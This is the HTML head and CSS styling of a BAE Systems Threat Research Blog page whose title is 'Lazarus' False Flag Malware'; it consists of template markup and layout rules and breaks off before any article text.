<!DOCTYPE html>
<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='https://www.blogger.com/static/v1/widgets/55013136-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
<meta content='0Gdhs7qJFR_2QHyAFCpxiAwHZOcJLqubEPCnkznXW3k' name='google-site-verification'/>
<link href="//fonts.googleapis.com/css?family=Open+Sans:700,400,300%7CViga%7CPT+Serif:400,700,400italic,700italic" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Oswald:400,700,300" rel="stylesheet" type="text/css">
<meta charset='utf-8'/>
<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
<meta content='IE=edge,chrome=1' http-equiv='X-UA-Compatible'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='https://baesystemsai.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="BAE Systems Threat Research Blog - Atom" href="https://baesystemsai.blogspot.com/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="BAE Systems Threat Research Blog - RSS" href="https://baesystemsai.blogspot.com/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="BAE Systems Threat Research Blog - Atom" href="https://www.blogger.com/feeds/7345515085838422799/posts/default" />

<link rel="alternate" type="application/atom+xml" title="BAE Systems Threat Research Blog - Atom" href="https://baesystemsai.blogspot.com/feeds/2633799336061422338/comments/default" />
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<link href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s640/client.PNG' rel='image_src'/>
<meta content='https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html' property='og:url'/>
<meta content='Lazarusâ€™ False Flag Malware' property='og:title'/>
<meta content='Written by Sergei Shevchenko and Adrian Nish   BACKGROUND' property='og:description'/>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/w1200-h630-p-k-no-nu/client.PNG' property='og:image'/>
<title>BAE Systems Threat Research Blog: Lazarus&#8217; False Flag Malware</title>
<style id='page-skin-1' type='text/css'><!--
/*
/*------------------------------------------------------
Variable @ Template Designer
--------------------------------------------------------
<Variable name="keycolor" description="Main Color" type="color" default="#66bbdd"/>
<Variable name="body.background" description="Body Background" type="background"
color="transparent" default="$(color) none repeat scroll top left"/>
<Group description="Body" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 16px/1.7em 'PT Serif', Georgia, Serif"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#555"/>
<Variable name="body.link.color" description="Link Color" type="color" default="#758ee2"/>
</Group>
<Group description="Heading" selector=".post h3, .widget h2">
<Variable name="heading.font" description="Title Font" type="font"
default="normal normal 14px/1.8em 'Open Sans', 'Helvetica Neue', Helvetica, Arial"/>
<Variable name="heading.color" description="Title Color" type="color" default="#222222"/>
</Group>
<Group description="Element" selector=".post h3, .widget h2">
<Variable name="post.title.font" description="Post Title Font" type="font"
default="normal normal 48px/1em 'Viga', 'Helvetica Neue', Helvetica, Arial"/>
<Variable name="widget.title.font" description="Widget Title Font" type="font"
default="normal normal 16px/1.8em 'Open Sans', 'Helvetica Neue', Helvetica, Arial"/>
<Variable name="branding.font" description="Tagline Font" type="font"
default="300 normal 48px/1.2em 'Open Sans', Helvetica, Arial"/>
</Group>
<Group description="Additional" selector=".navigation">
<Variable name="navigation.font" description="Navigation Font" type="font"
default="bold normal 13px/1.6em 'Open sans', 'Helvetica Neue', Helvetica, Arial"/>
<Variable name="scheme.color" description="Scheme Color" type="color" default="#7c98e4"/>
</Group>
------------------------------------------------------*/
/*------------------------------------------------------
00. Table of Content
--------------------------------------------------------
01. Reset CSS
02. Global
* font-family: PT Serif, Open Sans, Sans-serif;
* font-size: 16px;
03. Header
- Logo
- Navigation
04. Tagline
05. Slidetoggle
06. Main
- Primary Content
- Blog pager
- Comments
07. Sidebar
08. Widgets
- Flickr
- Popular posts
- Search
09. Footer
----------------------------------------------------- */
/*------------------------------------------------------
01. Reset CSS
------------------------------------------------------*/
body, html  { height: 100%}
html, body, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, font, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
b, u, i, center,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td {
margin: 0;
padding: 0;
border: 0;
outline: 0;
font-size: 100%;
vertical-align: baseline;
}
body { line-height: 1}
ol, ul { list-style: none}
blockquote, q { quotes: none}
blockquote:before, blockquote:after, q:before, q:after { content: ''; content: none}
:focus { outline: 0}
del { text-decoration: line-through}
table { border-collapse: collapse; border-spacing: 0}
/*------------------------------------------------------
02. Global
------------------------------------------------------*/
body {
color: #555555;
font-family: Arial, sans-serif;
}
.container {
background: #fff;
}
.content-wrapper {
background: #fff;
width: 1020px;
margin: 0 auto;
padding: 20px 0 50px;
}
/*
* Shortcode
*/
.left {
float:left
}
.right {
float:right
}
.center {
text-align:center
}
.clear {
clear:both
}
ul:after {
visibility: hidden;
display: block;
height: 0;
clear: both;
}
pre {
padding:10px;
margin:20px 0;
border:1px solid #ddd;
background:#e8e8e8;
overflow:auto;
}
pre br{
display:none;
}
code {
font:1em/1.2em 'courier new', courier, monospace;
}
a:link {
color: #333;
text-decoration: none;
}
a:visited,
a:hover {
color: #333;
text-decoration: underline;
}
h1, h2, h3, h4, h5, h6 {
font-family: 'Oswald', sans-serif;
font-weight: 700;
}
/*
* Button
*/
.button {
font: bold normal 13px/1.6em 'Open sans', 'Helvetica Neue', Helvetica, Arial;
text-transform: uppercase;
background-color: #758ee2;
padding: 7px 15px;
text-decoration: none !important;
border-radius: 2px;
overflow: hidden;
cursor: pointer;
display: inline-block;
color: #fff !important;
}
/*------------------------------------------------------
03. Header
------------------------------------------------------*/
.outer-header {
border-bottom: 7px solid rgb(252,76,2);
width: 100%;
}
.header-wrapper {
background: #fff;
width: 1020px;
margin: 0 auto;
padding: 30px 0 0;
clear: both;
}
.header h1 {
color: #333;
font-family: 'Oswald', sans-serif;
font-size: 22px;
font-weight: 700;
text-transform: uppercase;
}
.header .description {
font-size: 10px;
text-transform: uppercase;
}
#header {
margin-bottom: 16px;
}
.top-menu {
float: right;
}
.top-menu li {
display: inline-block;
}
.top-menu a {
color: #3a3a3a;
font-size: 12px;
padding: 0 5px;
}
/*
* Navigation
*/
.navigation {
width: 100%;
}
.navigation h2 {
display: none;
}
.navigation ul {
float: left;
}
.navigation ul li {
display: inline;
float: left;
}
.navigation ul li a {
display: block;
font: 16px/1.6 Arial, sans-serif;
color: #222;
padding: 10px 16px;
text-decoration: none;
}
.navigation li.selected a,
.navigation ul li a:hover {
background: rgb(252,76,2);
color: #fff;
}
.PageList LI.selected A {
font-weight: normal !important;
}
.PageList {
float: left;
width: auto;
}
.CustomSearch {
float: left;
height: 45px;
line-height: 45px;
margin-left: 1%;
width: 22%;
}
input.gsc-input {
border-radius: 2px;
padding: 8px 6px !important;
width: 94% !important;
}
input.gsc-search-button {
background: #333;
border: none !important;
color: #fafafa;
font-family: 'Open Sans', sans-serif;
font-size: 13px;
font-weight: 700;
margin-top: 6px;
margin-left: 12px !important;
outline: none;
padding: 8px 14px;
text-transform: uppercase;
-webkit-appearance: none;
border-radius: 0;
}
input.gsc-search-button:hover {
background: rgb(252,76,2);
}
div#BlogArchive1 {
display: none;
}
table.gsc-search-box td.gsc-input {
padding-right: 0 !important;
}
/*------------------------------------------------------
04. Tagline
------------------------------------------------------*/
.branding {
position: relative;
width: 100%;
}
.branding-wrap {
width: 1020px;
margin: auto;
position: absolute;
top: 0;
right: 0;
left: 0;
}
.branding .sidebar {
padding: 0 !important;
margin: 0;
text-align: center;
color: #fff;
font: 300 normal 48px/1.2em 'Open Sans', Helvetica, Arial;
}
.branding .sidebar .button {
background: transparent;
border: 2px solid #fff;
}
.branding .sidebar .widget {
margin: 0;
padding: 0;
}
.banner-text {
border-left: 7px solid #333;
float: left;
margin-top: 20px;
padding: 4px 0;
width: 520px;
}
.banner-text .widget-content span:first-of-type,
.banner-text .widget-content a,
.banner-text .widget-content p {
background: #333 !important;
color: #fff !important;
font-family: 'Oswald', sans-serif !important;
font-size: 36px !important;
font-weight: 700 !important;
line-height: 1.3 !important;
padding: 0 8px 0 0 !important;
text-transform: uppercase !important;
white-space: pre-wrap !important;
}
.banner-logo {
float: right;
margin-top: 20px;
}
div#Image1 .widget-content img {
min-height: 190px;
max-height: 300px;
}
div#Image2 {
margin: auto;
width: 1020px;
}
div#Image2 .widget-content {
position: absolute;
top: 22px;
right: 22%;
}
div#Image2 .widget-content img {
width: 210px;
}
/*------------------------------------------------------
05. Slidetoggle #theGrid
------------------------------------------------------*/
.slidetoggle {
padding: 40px 0;
background: #444;
color: #aaa;
text-align: center;
display: none;
}
.slides {
width: 1020px;
margin: 0 auto;
background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3h73woD4JYgcNu56jZPLZP804dpqYaalIQ1WZflaypk2WJvofBwql6wZBgUfEki_XCgccxMYSMMMuw_mxjIx55UwXVkiaUFyRRs51fB2FhWq3qwDVpy63llBNPpgUQO0MCpLAf_P2_T8T/s1600/border_slides.png) repeat-y center center;
}
.slides .grid {
width: 340px;
padding: 0;
}
.slides .grid .widget {
padding: 0 20px;
background: none;
margin-bottom: 0;
}
.slides .grid .widget h2 {
background: none;
color: #bbb;
}
.grid a,
.grid a:visited {
color: #f2f2f2;
}
.grid a:hover {
color: #fff;
text-decoration: underline;
}
/*------------------------------------------------------
06. Main
------------------------------------------------------*/
.main-wrapper {
width: 700px;
}
/*
* Primary content
*/
.post-outer {
padding-bottom: 50px;
border-bottom: 1px solid #ddd;
margin: 0 10px !important;
text-align: inherit !important;
}
.post h3.entry-title a, .post h3.entry-title {
color: #444;
margin: 10px 0 30px 0;
text-decoration: none;
text-transform: uppercase;
font-family: 'Oswald', sans-serif;
font-size: 24px;
font-weight: 700;
line-height: 1.5;
}
.post-body {
font-size: 15px;
line-height: 1.5em;
font-family: Arial, sans-serif;
}
.post-body img,
.post-body iframe {
max-width: 100%;
height: auto;
margin-top: -5px;
margin-bottom: 10px;
}
.post-body h1,
.post-body h2,
.post-body h3,
.post-body h4,
.post-body h5,
.post-body h6 {
margin-top: 20px;
margin-bottom: 20px
font-size: 48px;
line-height: 1.2em;
font-weight: normal;
}
.post-body h2 {
font-size: 37px;
}
.post-body h3 {
font-size: 32px;
line-height: 1.5em;
}
.post-body h4 {
font-size: 27px;
line-height: 1.6em;
}
.post-body h5 {
font-size: 20px;
line-height: 1.8em;
}
.post-body h6 {
font-size: 18px;
line-height: 1.8em;
}
.post-body blockquote {
font-style: italic;
line-height: 1.6em;
font-size: 22px;
margin: 30px 0 20px -20px;
padding-left: 15px;
border-left: 5px solid #758ee2;
}
.post-body blockquote p {
padding: 0;
margin: 0;
}
.post-body a:link,
.post-body a:visited {
text-decoration: underline;
}
.post-header-line-0 {
border-top: 1px dotted #c1c1c1;
color: #aaa;
margin-bottom: 20px;
padding-top: 20px;
}
.post-header-line-0 a {
color: #aaa;
text-decoration: underline;
}
.post-footer {
font: normal 13px/1.6em 'Open Sans', Helvetica, Arial;
color: #aaa;
margin-top: 40px;
}
.jump-link a {
color: #fff;
font: bold normal 13px/1.6em 'Open sans', 'Helvetica Neue', Helvetica, Arial;
text-transform: uppercase;
background: #444;
padding: 5px 20px;
border-radius: 2px;
}
.breadcrumbs {
font-size: 12px;
margin-bottom: 24px;
padding-left: 10px;
}
.breadcrumbs a {
text-decoration: underline !important;
}
/*
* Blog pager
*/
#blog-pager {
margin-top: 60px;
clear: both;
}
#blog-pager a {
float: left;
text-decoration: none;
color: #fff;
background: #ccc;
padding: 10px 20px;
text-transform: uppercase;
font: bold normal 13px/1.6em 'Open sans', 'Helvetica Neue', Helvetica, Arial;
border-radius: 2px;
}
#blog-pager a:hover {
background: rgb(252,76,2) url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0MOVywxg59TmK3wWYS0_1tb96BdjTnmRVa1AfIpa1FOY2BUfROxbSWEBQa48n_qWHncRbH8ERaVm2W2rtmJgB-KEOe_lymWdzhgnjI1Ya2srspqksFM68yBJhoHBqPXWWLWkb_2lBMUzJ/s1600/icon_home.png) no-repeat center;
}
#blog-pager span {
float: left;
margin-right: 5px;
}
#blog-pager .home-link {
margin-right: 5px;
width: 2px;
text-indent: -900px;
overflow: hidden;
background: #333 url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0MOVywxg59TmK3wWYS0_1tb96BdjTnmRVa1AfIpa1FOY2BUfROxbSWEBQa48n_qWHncRbH8ERaVm2W2rtmJgB-KEOe_lymWdzhgnjI1Ya2srspqksFM68yBJhoHBqPXWWLWkb_2lBMUzJ/s1600/icon_home.png) no-repeat center;
}
.feed-links {
display: none;
}
.status-msg-border {
border: none !important;
}
.status-msg-bg {
background-color: #eaeaea !important;
}
.blog-posts.hfeed {
box-sizing: border-box;
float: left;
margin-bottom: 20px;
width: 100%;
}
.blog-pager-older-link:hover,
.blog-pager-newer-link:hover {
background-image: none !important;
background-color: rgb(252,76,2);
}
/*
* Comments
*/
.comments {
margin-top: 40px;
padding-top: 20px;
border-top: 1px solid #ccc;
}
.comments h4 {
background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVfA0GdQOhwRczDQWsBNBqljELJkJqv0F-ISqWVMdv34kdWN4DXjER5M2PyP5XXvMsIdHw9UxRAXHObDPThud-06w1t2nusNiVmdvRXJNFpoCMuK-qOlaDaiZAGTBP9zBRZMFwg72maW9O/s1600/icon_comments.png) no-repeat left 5px;
margin-bottom: 20px;
padding-bottom: 20px;
padding-left: 30px;
clear: both;
font-family: 'Open Sans', sans-serif;
}
.comment-header .user {
padding-right:10px;
margin-right:10px;
border-right:1px solid #ddd;
}
.comment-header .user a {
font: normal normal 16px/1em 'Viga', 'Helvetica Neue', Helvetica, Arial;
text-decoration:none;
}
.comment-header span.blog-author,
.comment-header span.icon {display:none!important}
.comment-header .datetime a {
font-size: 12px;
color: #aaa;
}
.comment-thread li .comment-block {
border-bottom:1px dotted #ddd;
padding-bottom:10px;
}
.comment-content {
}
.comments blockquote {
margin-bottom:20px;
padding:10px 0;
border-bottom:1px solid #ddd;
line-height:1.6em;
}
#comment-holder .comment-block .comment-actions a {
font-size:12px;
margin-right:10px;
background-position:-15px center;
-o-transition: all 0.5s;
-moz-transition: all 0.5s;
-webkit-transition: all 0.5s;
}
#comment-holder .avatar-image-container {
border-radius: 2px;
overflow: hidden;
}
#comment-holder .avatar-image-container img {
}
#comments-block.avatar-comment-indent  {
position:relative;
margin:0 auto;
}
.widget-content.list-label-widget-content span {
color: rgb(252,76,2);
font-family: Arial, sans-serif;
font-size: 14px;
line-height: 1.5;
}
/*------------------------------------------------------
07. Sidebar
------------------------------------------------------*/
#sidebar {
margin-bottom: -40px;
}
#sidebar .widget h2 {
margin-left: -15px;
margin-right: -15px;
padding: 12px 15px;
font-family: 'Oswald', sans-serif;
font-size: 16px;
color: #444;
text-transform: uppercase;
background: #e1e1e1;
}
#sidebar .widget a:link,
#sidebar .widget a:visited {
text-decoration: none;
font-family: Arial, sans-serif;
font-size: 13px;
line-height: 1.5;
}
.sidebar-wrapper {
width: 300px;
margin-left: 20px;
border-radius: 2px;
}
.sidebar .widget h2 {
margin-bottom: 20px;
}
.sidebar .widget {
margin-bottom: 20px;
}
.sidebar .widget img,
.sidebar .widget iframe {
width: 100%;
height: auto;
}
div#Label2,
div#PopularPosts1 {
background: #efefef;
padding: 0 15px 15px;
}
div#HTML1, div#HTML2 {
background: #efefef;
padding: 0;
}
#HTML1 h2.title, #HTML2 h2.title {
background: #e1e1e1;
font-size: 16px;
margin: 0;
padding: 12px 15px;
}
#HTML1 .widget-content, #HTML2 .widget-content {
padding: 15px;
}
#HTML1 p, #HTML2 p {
color: #2c2c2c;
font-size: 13px;
line-height: 1.5;
}
.contact-info {
border-top: 1px dotted #c1c1c1;
float: left;
margin: 15px -15px 0;
padding: 15px;
width: 100%;
}
.contact-info a:first-of-type {
color: rgb(252,76,2);
}
.contact-btn {
background-color: #333;
background-image: url('https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_t67LO6b-KasWxCEGxBb43nRCr0pKRlsuP7LOhMvTn6qmrOmmv07xo4C6BVVuULhuO5NVyL5cdnv9o39dA-I-WPdmzzcABy9PaTmetyqt6ud99FlfDweBXx5Yi5XBkxIl6mYzssujnCUp6vbQzxaGIqBus=s0-d');
background-position: right center;
background-repeat: no-repeat;
border-radius: 8px;
color: #fff !important;
display: block;
float: left;
margin-bottom: 20px;
padding: 8px 24px 8px 10px;
}
.contact-btn:hover {
background-color: rgb(252,76,2);
}
span.tag-count {
background: #2c2c2c;
color: #fff !important;
float: right;
font-family: 'Open Sans', sans-serif !important;
font-size: 12px !important;
font-weight: bold;
padding: 0 5px;
}
.widget-content.list-label-widget-content li {
border-bottom: 1px solid #c1c1c1;
margin-bottom: 5px;
padding-bottom: 5px;
}
.widget-content.list-label-widget-content li:last-of-type {
border: none;
}
/*------------------------------------------------------
08. Widgets
------------------------------------------------------*/
.widget a {
text-decoration: none;
}
/*
* Flickr
*/
.flickr_wrap {
margin-left: -5px;
margin-right: -5px;
}
.flickr_badge_image {
float: left;
margin: 5px;
height: 60px;
width: 60px;
border-radius: 2px;
overflow: hidden;
}
.flickr_badge_image img {
height: 100%;
width: 100%;
}
.grid .flickr_wrap {
margin-left: -7px;
margin-right: -7px;
}
.grid .flickr_badge_image {
margin: 7px;
height: 64.5px;
width: 64.5px;
}
/*
* Popular Posts
*/
.PopularPosts ul li {
margin-bottom: 5px;
padding-bottom: 5px;
border-bottom: 1px solid #c1c1c1;
}
.PopularPosts ul li:last-of-type {
border: none;
}
.PopularPosts .item-title {
float: left !important;
min-height: 60px;
width: 74%;
}
.PopularPosts .item-title a {
font-weight: bold;
font-size: 14px !important;
line-height: 1.5 !important;
display: block;
margin-top: 5px;
text-decoration: none;
font-family: 'Oswald', sans-serif !important;
text-transform: uppercase;
}
.PopularPosts .item-snippet {
font-size: 14px;
line-height: 1.6em;
}
.PopularPosts .item-thumbnail {
width: 60px;
height: 60px;
border-radius: 2px;
overflow: hidden;
margin-right: 10px;
margin-top: 5px;
}
.PopularPosts .item-thumbnail img {
width: 60px;
height: 60px;
}
.post-labels a {
font-size: 14px !important;
font-family: Arial, sans-serif !important;
}
/*
* Search
*/
#searchform {
background: #fff;
padding: 10px;
border-radius: 2px;
border: 1px solid #e1e1e1;
overflow: hidden;
}
#searchform:after {
content: ".";
visibility: hidden;
display: block;
height: 0;
clear: both;
}
#searchform label {
display:none;
}
#searchform #s {
width: 150px;
border: 0;
padding: 0;
float: left;
color: #aaa;
}
#searchform #searchsubmit {
background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhIMt_iHr0pgw8VvSdKGq8R9pWLJCTqIruC105rZ0FG2SPzvKY22ci_nUsml6qf8XI6P6BlpG5RmlsKRJGEB8eqrzqKD-k9YCcjf1o4gw4XM0NPvuO9hPzaG6oTeKFjN5hr5pqtcnqmdWO/s1600/icon_search.png) no-repeat center center;
width: 20px;
float: right;
border: 0;
padding: 0;
text-indent: -900px;
}
.status-msg-wrap {
font-size: 14px !important;
margin: 20px auto !important;
width: 100% !important;
}
.status-msg-body {
text-align: inherit !important;
padding-left: 10px !important;
}
.status-msg-bg {
background: none !important;
}
.status-msg-body a {
background: #ccc;
border-radius: 2px;
color: #fff;
font-family: 'Open Sans', sans-serif;
font-size: 13px;
font-weight: bold;
float: right;
margin: -10px 20px 0 0;
padding: 10px 20px;
text-transform: uppercase;
}
.status-msg-body a:hover {
background: rgb(252,76,2);
}
/*------------------------------------------------------
09. Credit
------------------------------------------------------*/
footer.credit {
background: #444;
padding: 40px 0;
color: #ccc;
text-align: center;
}
footer.credit a {
color: #fff;
}
footer.credit a:hover {
text-decoration: underline;
}
footer { color : #FFFFFF }
footer nav { height : 96px; background : #222 }
footer .wrap { width: 1020px; margin: auto; }
footer div#social { background : #000000; font-weight : 700; padding-top : 40px }
footer div#social div#connect { float : left; display: block; margin-top: 14px; }
footer div#social span#connect-text { display : inline-block; line-height : 25px; position : relative; top : -6px; margin-right : 5px }
footer div#copyright { background : #000000; font-size : 80%; padding-top : 13px; padding-bottom : 50px }
/* UPDATED SOCIAL ICONS */
.social-icon-list { float: left; padding: 26px 0 26px 10px; list-style: none; }
.social-icon-list li { float: left; margin-right: 10px; cursor: pointer; height: 44px; width: 44px; position: relative; }
.social-icon-list li a { height: 0; width: 0; display: inline-block; position: absolute; top: 22px; left: 22px; margin: auto; background-size: 44px 44px; background-position: center; border-radius: 22px; transition: width 1.1s cubic-bezier(0.19, 1, 0.22, 1), height 1.1s cubic-bezier(0.19, 1, 0.22, 1), top 1.1s cubic-bezier(0.19, 1, 0.22, 1), left 1.1s cubic-bezier(0.19, 1, 0.22, 1), border-radius 1.5s cubic-bezier(0.19, 1, 0.22, 1) 0.2s; }
.social-icon-list li:hover a { width: 44px; height: 44px; border-radius: 0px; top: 0; left: 0; }
.social-icon-list .twitter-icon { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_uBZ9z7Dhd-26tnSCyUydDChOaS_K_uL0KGIs6DhjHBSvBTPBlrhmeZHsJNVerNDtBJc-u6XprIjwnZK5NoIEzoKrH5WNYjkLWD7MQdstaDxP5Bhxu1ubkC0wclF0_0Mk4=s0-d"); }
.social-icon-list .twitter-icon:hover a { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_t3iMBURZ7tQGfaO3glGQymWUznEAsQdTu32EEj7Bc-KzmkKJBah31MKv_rCatfUfE5peVmuuPJNKDUPfE2s0RU8ClOMCnc1N2Wu8AAyf7hWJos3KICQqpq_KiqvlDnDOI_XLgnLOfS=s0-d"); }
.social-icon-list .fb-icon { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_tBBpVAnx8lkZmCz6AqCOWSCaUjdDl9D-jBCzFYTNRXVCaY3ynu5ZkVKpJIglRb5INgnzoAf0nXq-8dgayrX97jZhaxrIGs3eeqlxvyaAMwdi7fvt0A0t7hfNrJ-P9JRIcI=s0-d"); }
.social-icon-list .fb-icon:hover a { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_uR8iyneKxHNYCw1pDeEeJTHWW-irer_ro_RJmqCbbcotwi4qLBbs_zZ1cQDEWtta2EueAqDbNlfeCP6P36xX-4zwRP2lSTVrVAuMRA86D2zLndkGtlIJwjJHR107aQV4wY7TOv7MLkwA=s0-d"); }
.social-icon-list .in-icon { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_u_AlN_TnanQr9k1CVXVoD8wuJvh-oX0PNm0QqGzBT4UQhois5VDtGqZ5jerHH3XVKYvVGLJ9mHZtTj6s40z25INYtWxpNMxXXNrWKR4BmRYl-chMZgO-lvQyVGCUngppl9=s0-d"); }
.social-icon-list .in-icon:hover a { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_uLR2Ez7fBU8rR3tH6S5o0U3YDYpPHPB2-hhAmHFm0Y7TfwVNlBXpwBHStuhhj29xdYE7mCSoYWUaSgoSonUE2Zq1SAX6p7Z5PxNOo2J7S0q47hj9_q_to_9audiEteec8CyKncF0hcmg=s0-d"); }
.social-icon-list .flickr-icon { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_uQsfSMezJknK3PPUYaf7RL7ly6r1O6pIV5W-GBJRzC4p8foeFKCYWjJOX2BfcH1snfEqWFxH8vxSwXFwEw4p1bhzCeTsQg9xP2KwIgXo6JbG3fO5lw31LHRBhS1s9NXPs=s0-d"); }
.social-icon-list .flickr-icon:hover a { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_tycGsVurat6Bel6WcHmS-5CN2V0caEbpoUxlNK8adp-ATWxXtIYynLBUJjGhXs6WRE42OqfTr0bFsNHNkdHR3IyZEpiH3yyO42sL3d6HAyTWd76dQuVJgShVhk9-wyVE6Fg-HKO30=s0-d"); }
.social-icon-list .youtube-icon { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_vsUDTB5w3jxJ-D3EXnbUf4aQr-FlHURuWOrJdrhA7am8gB1n4omfT07orcxY3fF-aWBYG03i7idiu4UftfZ-c3udaz4tu4V7ZEJ-HWcREEaCIeOPYfQPwSkzL3h58LKj1P=s0-d"); }
.social-icon-list .youtube-icon:hover a { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_swg-kgNkty2-yBua_ON-xM5dYdzljB5InjwascUXcqe3CsZMOBRMQ_0SZslljLXwHRyxSSAjU4Fzpv__RQMt0c-Wnc3VXn8WPg4OD8JfyCFP49XTUMuikcc_1X8x0B4n1vvw1UaJLw=s0-d"); }
/* FOOTER UPDATES */
.footerWrapper { background: url("https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_vKehVy-6AuoB7-gLNjSkUIiTOZqDlBaonYEP-7S411xGyriBXrJI_kHKNvaYS5xL31jrG7j0ZKIVPAB8M_OlfdwpV93Djec-MIJe8FSNIrqV-vsa-yD7U6YONKyf20Yms=s0-d") right center; background-repeat: no-repeat; margin: auto; min-height: 96px;}
.bottom-bar { background: #111; min-height: 48px; }
.footerList { padding: 12px 0; float: left; list-style: none; line-height: 24px; }
.footerList li { float: left; position: relative; }
.footerList li a { color: #666; font-size: 12px; font-family: Arial, sans-serif; border-right: 1px solid #666; padding: 0 10px; text-decoration: none; }
.footerList li:last-child a { border: none; }
.copy { float: right; padding: 12px 0; color: #666; font-size: 12px; line-height: 24px; }
.copyright { float: right; line-height: 24px; color: #666; font-family: Arial, sans-serif; font-size: 12px; padding: 12px 0; }
blockquote {
width:450px;
quotes: '"' '"';
text-align:left;
padding: 0.5em 10px;
margin: 1.5em 10px;
border-left: 4px solid #fc4c02;
}
blockquote:before {
content: open-quote;
font-size: 24pt;
text-align: center;
line-height: 42px;
color: #fff;
background: #ddd;
float: left;
position: relative;
border-radius: 25px;
margin-right: 0.5em;
vertical-align: -0.4em;
/** define it as a block element **/
display: block;
height: 25px;
width: 25px;
}
blockquote:after {
content: close-quote;
font-size: 24pt;
text-align: center;
line-height: 42px;
color: #fff;
background: #ddd;
float: right;
position: relative;
border-radius: 25px;
margin-right: 1em;
vertical-align: -0.5em;
/** define it as a block element **/
display: block;
height: 25px;
width: 25px;
}
blockquote:hover:after, blockquote:hover:before {
background-color: #FC4C02;
transition: all 350ms;
-o-transition: all 350ms;
-moz-transition: all 350ms;
-webkit-transition: all 350ms;
}
--></style>
<!-- = / jQuery /= -->
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script src="//i-biyan.com/js/html5.js"></script>
<!-- = / JS Trigger / = -->
<!-- = / conditional statement / = -->
<!-- = / Responsive / = -->
<style>
    @media screen and (max-width: 1040px) {
      .header-wrapper {
        width: 900px;
      }
      .branding .sidebar {
        margin: 0 auto;
      }
      .content-wrapper {
        width: 900px;
      }
      .main-wrapper {
        width: 580px;
		padding: 0 60px;
		box-sizing: border-box;
      }
      .slides {
        width: 760px;
        background-image: none;
      }
      .slides .grid {
        width: 233.33333333333333333333333333333px;
        margin-left: 10px;
        margin-right:10px;
      }
	  .navigation ul li a {
	    font-size: 14px;
		padding: 12px 14px;
      }
	  .branding-wrap {
		width: 900px;
      }
	  .sidebar-wrapper {
		margin: 0 10px;
      }
	  footer .wrap {
		width: 880px;
		padding: 0 10px;
      }
	  .banner-text span {
		font-size: 32px;
      }
    }

	@media screen and (max-width: 920px) {
	  .header-wrapper {
		width: 740px;
      }
	  #header {
		margin-left: 2%;
      }
	  .PageList {
		float: none;
		margin: auto;
		width: 96%;
      }
	  .CustomSearch {
		float: none;
		margin: auto;
		width: 40%;
      }
	  .branding-wrap {
		width: 740px;
      }
	  .content-wrapper {
		width: 740px;
      }
	  .main-wrapper {
		width: 460px;
		padding: 0 20px;
      }
	  .post-body .thumbs {
		width: 120px;
		height: 120px;
      }
	  .sidebar-wrapper {
		width: 260px;
      }
	  .PopularPosts .item-title {
		width: 68%;
      }
	  footer .wrap {
		width: 720px;
      }

    }

    @media screen and (max-width: 767px) {
      .header-wrapper {
        width: 100%;
		padding-top: 20px;
      }
      .header, .navigation {
        width: 100%;
        float: none;
        clear: both;
        text-align: center;
      }
      .header img {
        margin-left: auto;
        margin-right: auto;
      }
	  div#header {
		width: auto;
		float: left;
		margin: -18px 0 20px 23px;
      }
      .navigation {
        margin-top: 30px;
      }
      .navigation ul li {
        text-align: center;
        display: inline;
      }
      .branding .sidebar {
        width: 100%;
      }
	  .branding-wrap {
		width: 90%;
		margin: auto;
      }
	  div#Image1 .widget-content img {
		min-height: 200px;
      }
